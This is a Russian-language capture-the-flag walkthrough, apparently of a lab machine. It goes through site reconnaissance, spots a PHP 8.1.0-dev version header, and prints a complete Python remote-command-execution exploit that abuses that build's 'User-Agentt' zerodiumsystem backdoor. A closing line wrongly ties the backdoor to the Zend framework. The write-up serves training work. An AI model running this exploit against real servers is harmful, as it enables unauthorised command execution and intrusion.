Зайдя на сайт видим, что в целом это обычный сайт, функционал у него урезанный, многие страницы не открываются

![](../images/Pasted%20image%2020260502144556.png)

Открывая 404 page и blank появляется имя Админа, можем на всякий случай запомнить его

![](../images/Pasted%20image%2020260502144654.png)

Изучая запросы и ответы, которые создаются при взаимодействии можно подметить несколько интересных вещей.

Есть версия SB Admin 2 v4.1.3. Поискав в интернете информацию про неё, ничего интересного я не нашел, поэтому перешел к изучению дальше.

![](../images/Pasted%20image%2020260502144830.png)

Находим ещё одну зацепку, версия php, поищем информацию про неё

![](../images/Pasted%20image%2020260502144938.png)

Находим информацию о получении доступа к системе через данную версию php

![](../images/Pasted%20image%2020260502145041.png)

Далее я нашел полноценный эксплоит для этой версии php

```
#Usage: python3 php_8.1.0-dev.py -u http://10.10.10.242/ -c ls

#!/usr/bin/env python3
import requests
import argparse

from requests.models import parse_header_links 

s = requests.Session()

def checkTarget(args):
    r = s.get(args.url)    
    for h in r.headers.items():
        if "PHP/8.1.0-dev" in h[1]:
            return True
    return False


def execCmd(args):
    r = s.get(args.url, headers={"User-Agentt":"zerodiumsystem(\""+args.cmd+"\");"})
    res = r.text.split("<!DOCTYPE html>")[0]
    if not res:
        print("[-] No Results")
    else:
        print("[+] Results:")
    print(res.strip())


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target URL (Eg: http://10.10.10.10/)", required=True)
    parser.add_argument("-c", "--cmd", help="Command to execute (Eg: ls,id,whoami)", default="id")
    args = parser.parse_args()

    if checkTarget(args):
        execCmd(args)
    else:
        print("[!] Not Vulnerable or url error")
        exit(0)
    
if __name__ == "__main__":
    main()
```

This backdoor was related to the Zend PHP framework.

Проверим его

![](../images/Pasted%20image%2020260502145538.png)

Он сработал. Далее изучаем систему и находим флаг

![](../images/Pasted%20image%2020260502171834.png)

